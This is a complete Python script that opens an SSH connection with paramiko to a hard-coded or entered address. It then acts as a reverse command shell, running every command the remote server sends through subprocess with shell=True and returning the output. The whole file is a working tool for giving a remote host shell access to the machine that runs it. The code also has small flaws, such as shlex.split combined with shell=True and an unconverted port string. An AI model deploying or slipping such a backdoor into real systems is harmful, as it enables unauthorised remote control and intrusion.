#!/usr/bin/env python3
import paramiko
import shlex
import subprocess


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())
        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'okay')
            except Exception as e:
                ssh_session.send(str(e).encode())
        client.close()
    return


if __name__ == '__main__':
    import getpass
    # user = getpass.getuser()
    user = input('User: ') or 'luke'
    password = getpass.getpass()

    ip = input('Enter Server IP: ') or '192.168.179.128'
    port = input('Enter port: ') or 2222
    ssh_command(ip, port, user, password, 'dir')
